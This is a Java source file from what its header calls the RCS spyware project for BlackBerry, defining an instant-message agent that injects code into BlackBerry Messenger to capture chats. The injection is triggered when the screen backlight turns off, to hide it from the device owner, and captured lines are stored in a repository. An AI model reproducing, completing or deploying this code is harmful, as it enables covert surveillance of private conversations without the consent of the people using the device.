//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.device.api.system.Backlight;
import blackberry.AgentManager;
import blackberry.AppListener;
import blackberry.agent.im.ImRepository;
import blackberry.agent.im.Line;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Utils;

/**
 * Instant Message.
 */
public final class ImAgent extends Agent implements BacklightObserver,
        ApplicationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
    //#endif

    private static final long APP_TIMER_PERIOD = 3000;

    AppInjector appInjector;
    //boolean infected;

    String appName = "Messenger";
    ImRepository imRepository;

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentEnabled) {
        super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");

        //#ifdef IM_FORCED
        enable(true);
        //#endif

    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        imRepository = new ImRepository();
        
        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
    }

    public static ImAgent getInstance() {
        return (ImAgent) AgentManager.getInstance().getItem(Agent.AGENT_IM);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addBacklightObserver(this);
        AppListener.getInstance().addApplicationObserver(this);

        try {
            appInjector = new AppInjector(AppInjector.APP_BBM);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }

    }

    private void menuInject() {
        //#ifdef DEBUG
        debug.trace("menuInject");
        //#endif

        appInjector.infect();
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeBacklightObserver(this);
        AppListener.getInstance().removeApplicationObserver(this);
    }

    boolean infecting = false;

    public void actualRun() {

        if (appInjector.isInfected() && Backlight.isEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            //appInjector.callMenuInContext();
        }
        //#ifdef DEBUG
        if (!appInjector.isInfected() && !infecting) {
            infecting = true;
            menuInject();
        }
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        if (confParameters != null) {
            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
        } else {
            debug.trace("parse: null");
        }
        //#endif

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
        return false;
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif

            //TODO: qui bisogna verificare che non avvengano due injection alla volta
            menuInject();
        }
    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }

    public boolean has(String partecipants, Line line) {
        if (imRepository == null) {
            imRepository = new ImRepository();

        }
        boolean alreadySaved = imRepository.has(partecipants, line);
        return alreadySaved;
    }

    public void add(String partecipants, Line line) {
        // TODO Auto-generated method stub

    }

}
